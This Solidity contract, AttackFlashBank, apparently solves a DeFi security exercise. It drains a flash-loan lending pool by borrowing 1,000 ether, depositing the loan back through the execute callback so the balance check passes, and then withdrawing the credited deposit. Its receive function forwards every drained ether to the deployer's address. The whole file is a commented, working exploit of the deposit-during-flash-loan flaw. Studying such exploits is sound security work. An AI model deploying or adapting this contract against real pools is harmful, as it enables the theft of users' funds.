// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashBankLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract AttackFlashBank {
    address flashBankLenderPoolAddress;
    address attacker;

    constructor(address _flashBankLenderPoolAddress) {
        flashBankLenderPoolAddress = _flashBankLenderPoolAddress;     
        attacker = msg.sender;   
    }

    receive() external payable {
        // When we got the funds, we send them to the attacker address
        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success);
    }

    function attack() external {
        // First we take a flash loan for the total amount of ETH that is on the pool (function flashLoan)
        IFlashBankLenderPool(flashBankLenderPoolAddress).flashLoan(1_000 ether);
        // After the following function execution: IFlashBankLenderPool.flashLoan() -> AttackFlashBank.execute() -> IFlashBankLenderPool.deposit()
        // We can now withdraw all the funds
        IFlashBankLenderPool(flashBankLenderPoolAddress).withdraw();
    }

    function execute() external payable {
        // On the flashLoan function there is a call to execute{value: amount}(), which arrives here.
        // Then we call the deposit function with the same amount of the loan.
        // In this way, the total balance of the pool hasnt change and we can pass the require at line 31
        IFlashBankLenderPool(flashBankLenderPoolAddress).deposit{value: msg.value}();
    }
}